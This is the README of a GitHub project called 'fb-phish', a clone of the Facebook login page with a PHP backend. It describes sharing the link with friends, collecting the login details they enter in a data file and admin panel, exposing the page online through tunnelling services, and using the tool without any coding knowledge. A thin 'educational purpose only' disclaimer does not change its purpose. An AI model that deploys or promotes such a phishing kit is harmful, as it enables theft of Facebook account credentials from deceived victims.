
# fb-phish

<p align="left"> <img src="https://komarev.com/ghpvc/?username=paradoxmain&label=Project%20viewed&color=0e75b6&style=flat" alt="paradoxmain" /> </p>
This is the clone for Fb, remaked with some backend support using php.

## HOW IT WORKS?
Straight forward when you finish installing this, you share the link to your friends and when they fill the informations, You see it!!
There are two ways to see the informations filled one is by:
- Click the box which is at the buttom of the login page, with that you will be taken to the admin pannel, where you will see all the filled informations.
- Another one is the same as above but you just add **/admin.php** at the end of your server *url*, for eg *localhost:8080/admin.php*.
- The other way is by using *terminal* which is cool, just open another tab ( don't close the php server! ), and type **watch -n 5 'cat backend/data.txt'**

## Authors

- [@reprogamaco](https://www.github.com/reprogamaco)



## Installation in linux enviroments [ Kali Linux | Termux & all Other Linux Distros ]

To install this project

```bash
  git clone https://github.com/paradoxmain/fb-phish.git
  cd fb-phish
  unzip FB-Phish.zip
  php -S localhost:8080
```

Then open another session

```bash
    watch -n 5 'cat backend/data.txt'
```


## How to make it available online?

You can use **ngrok**, **localexpose** or other similar services that makes the tunnelling.


## FAQ

#### Question1: Can fb-phish used in Termux devices?

Yes, *Just use the same procedures*.

#### Question 2: Can I use this tool without knowledge of code?

Yes!


## DISCLAIMER!!!

Hacking is illegal, This is made for educational purpose only. I will not be responsible for any kind of misuse of this tool. Please check the regulations of your country before using this TOOL.



<img src="https://image1.slideserve.com/1787542/disclaimer-l.jpg" style="text-align: center" />


## License

No licence

